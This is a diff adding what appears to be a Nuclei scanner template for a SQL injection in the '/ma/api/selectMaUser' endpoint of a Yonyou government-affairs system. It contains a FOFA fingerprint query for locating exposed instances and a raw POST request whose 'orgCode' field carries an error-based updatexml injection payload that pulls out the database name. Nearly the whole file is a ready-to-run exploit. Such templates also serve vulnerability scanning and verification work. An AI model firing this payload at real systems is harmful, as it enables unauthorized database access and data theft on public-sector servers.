@@ -1,0 +1,30 @@
+id: poc-szg26pz1wwgzxiao
+info:
+  name: 用友政务系统 selectMaUser 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/szg26pz1wwgzxiao'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: szg26pz1wwgzxiao
+    fofa: (body="eyeclose.png" && body="用友") || body="/df/access/public/pf/portal" || body="/pf/portal/login/css/foundation-datepicker.css" || body="/df/portal/getYearRgcode.do"
+http:
+- raw:
+  - 'POST /ma/api/selectMaUser HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.2307.6 Safari/537.36
+
+    Content-Length: 88
+
+
+    {"orgCode":"1'' AND (updatexml(1,concat(0x7e,(select database()),0x7e),1)) AND ''1''=''1"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
